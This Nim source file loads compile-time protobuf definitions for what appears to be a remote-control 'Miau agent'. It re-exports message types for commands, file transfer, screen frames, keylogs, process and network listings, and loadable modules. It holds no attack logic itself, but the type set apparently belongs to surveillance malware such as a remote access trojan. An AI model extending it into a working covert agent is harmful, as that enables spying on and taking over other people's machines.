## Compile-time protobuf definitions for Miau agent (from miau.proto).
## Uses protobuf-nim macro parser; no external protoc needed.
import protobuf

const protoSpec = staticRead("miau.proto")
parseProto(protoSpec)

export protobuf

# Convenience re-export of key types so callers write `miau_Envelope`.
export miau_Envelope, miau_ClientAuth, miau_AuthAck, miau_Heartbeat
export miau_Command, miau_Response, miau_FileEntry, miau_FileList
export miau_FileChunk, miau_ScreenFrame, miau_KeyLog, miau_ProcessEntry
export miau_ProcessList, miau_NetEntry, miau_NetList, miau_ModuleHeader
export miau_SysInfo, miau_ClientEvent
export miau_PacketType, miau_CommandType, miau_ResponseStatus
